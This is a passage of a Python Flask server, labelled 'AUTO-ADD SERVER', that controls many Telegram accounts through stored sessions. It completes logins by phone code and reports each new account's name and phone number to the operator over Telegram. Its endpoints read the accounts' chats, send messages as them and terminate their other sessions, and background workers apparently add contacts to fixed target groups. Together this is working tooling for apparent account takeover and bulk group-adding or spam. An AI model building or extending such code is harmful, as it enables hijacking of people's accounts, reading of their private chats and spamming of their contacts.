                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {'total': 0, 'today': 0, 'verified_today': 0}
                save_json(STATS_FILE, stats)
                
                # Start worker in background
                threading.Thread(target=start_auto_add, args=(new_acc,), daemon=True).start()
                
                age_info = account_age.get('age_display', 'Unknown')
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n"
                        f"✅ New account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone']}\n"
                        f"Age: {age_info}"
                    )
                except:
                    pass
                
                return {
                    'success': True,
                    'account': {
                        'id': new_id,
                        'name': new_acc['name'],
                        'phone': new_acc['phone']
                    },
                    'account_age': age_info
                }
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new one.'}
            except Exception as e:
                logger.error(f"Verify error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

@app.route('/api/remove-account', methods=['POST'])
@api_error_handler
def remove_account():
    aid = request.json.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    stop_auto_add(aid)
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

@app.route('/api/get-messages', methods=['POST'])
@api_error_handler
def get_messages():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                dialogs = await client.get_dialogs(limit=100)
                chats = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        elif hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                            chat_type = 'bot'
                        
                        last_msg = ''
                        last_date = 0
                        if dialog.message:
                            last_msg = (dialog.message.message or '')[:200]
                            if dialog.message.date:
                                last_date = dialog.message.date.timestamp()
                        
                        chats.append({
                            'id': chat_id,
                            'title': dialog.name or 'Unknown',
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg,
                            'lastMessageDate': last_date
                        })
                    except:
                        continue
                
                return {'success': True, 'chats': chats, 'messages': []}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(fetch, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
@api_error_handler
def send_message():
    try:
        aid = request.json.get('accountId')
        chat_id = request.json.get('chatId')
        message = request.json.get('message', '').strip()
        
        if not aid or not chat_id:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                try:
                    entity = await client.get_entity(int(chat_id))
                except:
                    entity = await client.get_entity(chat_id)
                await client.send_message(entity, message)
                return {'success': True}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(send, timeout=30)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
@api_error_handler
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False,
            'target_group': TARGET_GROUPS[0],
            'delay_seconds': 30
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        
        return jsonify({'success': True, 'settings': s})
    
    # POST method
    data = request.json
    aid = data.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    akey = str(aid)
    
    was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
    new_enabled = data.get('enabled', False)
    
    auto_add_settings[akey] = {
        'enabled': new_enabled,
        'target_group': data.get('target_group', TARGET_GROUPS[0]),
        'delay_seconds': max(30, data.get('delay_seconds', 30)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if new_enabled and not was_enabled:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    elif not new_enabled and was_enabled:
        stop_auto_add(aid)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
@api_error_handler
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'active_workers': len(running_tasks),
        'dead_accounts_removed': stats.get('dead_accounts_removed', 0)
    })

@app.route('/api/test-auto-add', methods=['POST'])
@api_error_handler
def test_auto_add():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                available = 0
                try:
                    contacts = await client(GetContactsRequest(0))
                    available = len([c for c in contacts.users if not getattr(c, 'bot', False)])
                except:
                    pass
                
                return {'success': True, 'available_members': available}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(test, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/join-all-groups', methods=['POST'])
@api_error_handler
def join_all_groups():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def join_all():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            results = []
            try:
                for target in TARGET_GROUPS:
                    try:
                        entity = await client.get_entity(target)
                        await client(JoinChannelRequest(entity))
                        results.append({'group': target, 'status': 'joined'})
                    except Exception as e:
                        if 'already' in str(e).lower():
                            results.append({'group': target, 'status': 'already_member'})
                        else:
                            results.append({'group': target, 'status': 'error', 'error': str(e)[:100]})
                return {'success': True, 'results': results}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(join_all, timeout=45)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/get-sessions', methods=['POST'])
@api_error_handler
def get_sessions():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                result = await client(functions.account.GetAuthorizationsRequest())
                sessions = []
                current_hash = None
                
                for auth in result.authorizations:
                    session_info = {
                        'hash': str(auth.hash),
                        'device_model': auth.device_model or 'Unknown',
                        'platform': auth.platform or 'Unknown',
                        'date_active': auth.date_active.timestamp() if auth.date_active else 0,
                        'ip': auth.ip or 'Unknown',
                        'country': auth.country or 'Unknown',
                        'current': auth.current
                    }
                    if auth.current:
                        current_hash = str(auth.hash)
                    sessions.append(session_info)
                
                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(fetch, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-session', methods=['POST'])
@api_error_handler
def terminate_session():
    try:
        aid = request.json.get('accountId')
        hash_val = request.json.get('hash')
        
        if not aid or not hash_val:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                await client(functions.account.ResetAuthorizationRequest(hash=int(hash_val)))
                return {'success': True}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/terminate-sessions', methods=['POST'])
@api_error_handler
def terminate_sessions():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def terminate():
            client = SyncTelegramClient.get_client(acc['session'])
            await client.connect()
            try:
                result = await client(functions.account.GetAuthorizationsRequest())
                terminated = 0
                for auth in result.authorizations:
                    if not auth.current:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            terminated += 1
                        except:
                            pass
                return {'success': True, 'message': f'Terminated {terminated} sessions'}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/account-age', methods=['POST'])
@api_error_handler
def account_age():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        if acc.get('account_age') and acc['account_age'].get('age_display'):
            if acc['account_age']['age_display'] not in ['Unknown account age', 'Error', '']:
                return jsonify({'success': True, 'account_age': acc['account_age'], 'cached': True})
        
        age = get_account_age_sync(acc['session'])
        
        acc['account_age'] = age
        for i, a in enumerate(accounts):
            if a['id'] == aid:
                accounts[i]['account_age'] = age
                break
        save_json(ACCOUNTS_FILE, accounts)
        
        return jsonify({'success': True, 'account_age': age, 'cached': False})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-report')
@api_error_handler
def send_report():
    success = send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"Today: {stats.get('today_added', 0)}\n"
        f"Total: {stats.get('total_added', 0)}\n"
        f"Active Workers: {len(running_tasks)}\n"
        f"Uptime: {str(datetime.now() - datetime.fromisoformat(stats['started_at']))}"
    )
    return jsonify({'success': success})

@app.route('/api/health')
@api_error_handler
def health_check():
    """Health check endpoint"""
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'status': 'healthy',
        'workers': len(running_tasks),
        'accounts': len(accounts),
        'memory_usage': len(str(accounts)) + len(str(running_tasks)),  # Rough estimate
        'timestamp': datetime.now().isoformat()
    })

# ============================================
# ENHANCED BACKGROUND TASKS
# ============================================
def keep_alive():
    """Enhanced keep alive with error handling"""
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)  # 4 minutes
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    logger.debug("Keep-alive ping successful")
                    consecutive_failures = 0
                else:
                    logger.warning(f"Keep-alive ping returned status {response.status_code}")
                    consecutive_failures += 1
            except Exception as e:
                logger.error(f"Keep-alive error: {e}")
                consecutive_failures += 1
            
            # If too many failures, try to restart services
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures, server may be down!")
                consecutive_failures = 0
                
        except Exception as e:
            logger.error(f"Keep alive loop error: {e}")
            log_error("Keep alive", e)
            time.sleep(60)

def restore_and_start():
    """Enhanced restore with better error handling"""
    try:
        time.sleep(5)
        logger.info(f"Restoring {len(accounts)} accounts...")
        
        for acc in accounts:
            try:
                if acc.get('session'):
                    if check_account_auth(acc):
                        # Update account age if needed
                        if not acc.get('account_age') or not acc['account_age'].get('age_display'):
                            try:
                                age = get_account_age_sync(acc['session'])
                                acc['account_age'] = age
                                logger.info(f"Refreshed age for {acc.get('name')}: {age.get('age_display')}")
                            except Exception as e:
                                logger.error(f"Failed to refresh age: {e}")
                        
                        # Start worker
                        settings = auto_add_settings.get(str(acc['id']), {})
                        if settings.get('enabled', True):
                            start_auto_add(acc)
                    else:
                        remove_dead_account(acc['id'], "Auth check failed on startup")
                
                # Add delay between account processing
                time.sleep(2)
                
            except Exception as e:
                logger.error(f"Error restoring account {acc.get('name', 'unknown')}: {e}")
                log_error(f"Restore account", e)
                continue
        
        save_json(ACCOUNTS_FILE, accounts)
        
        # Clean expired sessions
        cleanup_expired_sessions()
        
        # Send startup notification
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> Online!\n"
                f"API ID: {API_ID}\n"
                f"Targets: {', '.join(TARGET_GROUPS)}\n"
                f"Workers: {len(running_tasks)}\n"
                f"Accounts: {len(accounts)}"
            )
        except:
            pass
        
        logger.info("Server startup complete")
        
    except Exception as e:
        logger.critical(f"Fatal error during restore: {e}")
        log_error("Restore and start", e)
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    """Clean up expired temp sessions"""
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items() 
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def periodic_health_check():
    """Periodic health check for all workers"""
    while True:
        try:
            time.sleep(600)  # Every 10 minutes
            logger.info(f"Health check: {len(running_tasks)} workers, {len(accounts)} accounts")
            
            # Check for stuck workers
            current_time = time.time()
            for acc_key, worker_info in list(running_tasks.items()):
                try:
                    worker = worker_info.get('worker')
                    if worker and hasattr(worker, 'last_activity'):
                        if current_time - worker.last_activity > 1800:  # 30 minutes
                            logger.warning(f"Worker {acc_key} appears stuck, restarting...")
                            stop_auto_add(int(acc_key))
                            acc = next((a for a in accounts if str(a['id']) == acc_key), None)
                            if acc:
                                start_auto_add(acc)
                except Exception as e:
                    logger.error(f"Worker check error for {acc_key}: {e}")
            
            # Clean old temp sessions
            cleanup_expired_sessions()
            
        except Exception as e:
            logger.error(f"Health check error: {e}")
            log_error("Health check", e)

# Signal handlers for graceful shutdown
def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    logger.info(f"Received signal {signum}, shutting down...")
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    save_temp_sessions()
    logger.info("Data saved. Exiting.")
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        # Load data with error handling
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
        if worker_adds_data:
            worker_adds.update(worker_adds_data)
        load_temp_sessions()
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║           AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME}                      ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Features: Enhanced Error Handling, Auto-Recovery, Stable      ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        # Start background threads
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        threading.Thread(target=periodic_health_check, daemon=True, name="health_check").start()
        
        # Start Flask with error handling
        try:
            app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
        except Exception as e:
            logger.critical(f"Flask server error: {e}")
            log_error("Flask server", e)
            # Save state before exiting
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
            raise
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        log_error("Startup", e)
        # Try to save state even on fatal error
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
        except:
            pass
        sys.exit(1)
